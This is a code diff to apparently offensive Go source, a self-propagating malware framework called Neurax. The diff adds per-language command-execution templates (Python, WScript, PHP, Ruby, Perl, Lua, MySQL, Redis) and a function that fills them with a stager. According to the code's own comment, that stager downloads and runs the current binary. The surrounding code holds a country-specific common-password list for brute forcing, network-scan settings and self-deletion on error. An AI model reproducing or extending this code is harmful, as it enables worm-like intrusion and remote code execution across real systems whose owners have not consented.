@@ -81,6 +81,18 @@ var CommonPasswordsCountries = map[string][]string{
 	"hi": []string{"123456", "Indya123", "123456789", "1234567Qq", "password", "12345", "12345678", "indya123D", "1234", "10577", "krishna", "zxcvbnm", "1234567", "indian", "111111", "sairam", "computer", "qwerty", "iloveyou", "1qaz", "123123", "1234567890", "abc123", "ganesh", "saibaba", "sachin", "mother", "abcd1234", "india123", "lakshmi", "welcome", "654321", "aicte@123", "iloveu", "786786", "expert12", "friends", "tabasum786", "sweety", "abcdef", "jaimatadi", "rajesh", "omsairam", "anjali", "priyanka", "hanuman", "7024371253", "police123", "000000", "sanjay", "samsung", "ramesh", "suresh", "deepak", "aaaaaa", "balaji", "asdfgh", "friend", "hariom", "manish", "aditya", "sandeep", "Password", "asdfghjkl", "success", "lovely", "cricket", "abhishek", "prasad", "cutecatvip", "jasmine", "flower", "prakash", "engineer", "999999", "poonam", "sandhya", "sharma", "prince", "666666", "987654321", "master", "pass2512", "santosh", "venkat", "archana", "manisha", "never", "vijaya", "chennai", "kumar", "simran", "rashmi", "karthik", "ashish", "qwertyuiop", "asdf1234", "mahesh", "rakesh", "sriram", "qwer1234", "internet", "passion", "khushi", "Mango123", "sweetheart", "vishal", "kannan", "waheguru", "143143", "creative", "chandra", "bharat", "naveen", "chinnu", "praveen", "srinivas", "kavitha", "babynaaz123", "pradeep", "555555", "aaaaaaaa", "indya123", "welcome123", "ganesha", "ramram", "dinesh", "sunita", "bangalore", "admin123", "preeti", "radhika", "bismillah", "test", "mechanical", "nikhil", "redrose", "yamaha", "secret", "shilpa", "loveyou", "anitha", "chinna", "loveme", "kalpana", "pankaj", "superman", "vijay", "doctor", "vishnu"},
 }
 
+var LangExecutors = map[string]string{
+	"python_os":         `import os; os.system("COMMAND")`,
+	"python_subprocess": `import subprocess; subprocess.call("COMMAND", shell=True)`,
+	"javascript":        `var shl = WScript.CreateObject("WScript.Shell"); shl.Run("COMMAND");`,
+	"php":               `exec("COMMAND")`,
+	"ruby":              "`COMMAND`",
+	"perl":              `system("COMMAND");`,
+	"lua":               `os.execute("COMMAND")`,
+	"mysql":             `\! COMMAND`,
+	"redis":             `eval "os.execute('COMMAND')"`,
+}
+
 type __N struct {
 	Stager                   string
 	StagerSudo               bool
@@ -107,7 +119,7 @@ type __N struct {
 	ScanThreads              int
 	ScanFullRange            bool
 	ScanGatewayFirst         bool
-	ScanOnly                 bool
+	ScanFirstOnly            bool
 	Base64                   bool
 	ScanRequiredPort         int
 	Verbose                  bool
@@ -158,7 +170,7 @@ var N = __N{
 	ScanThreads:              10,
 	ScanFullRange:            false,
 	ScanGatewayFirst:         false,
-	ScanOnly:                 false,
+	ScanFirstOnly:            false,
 	Base64:                   false,
 	Verbose:                  false,
 	Remove:                   false,
@@ -189,6 +201,10 @@ func ReportError(message string, e error) {
 			os.Remove(os.Args[0])
 		}
 	}
+}
+
+func NeuraxStagerLang(name string) string {
+	return strings.Replace(LangExecutors[name], "COMMAND", NeuraxStager(), -1)
 }
 
 //Returns a command stager that downloads and executes current binary
@@ -574,7 +590,7 @@ func neurax_scan_active(f func(string)) {
 	if len(N.ScanFirst) != 0 {
 		targets = append(targets, targets_lookup(N.ScanFirst)...)
 	}
-	if N.ScanOnly {
+	if N.ScanFirstOnly {
 		targets = targets_lookup(N.ScanFirst)
 	}
 	if N.ScanArpCache {
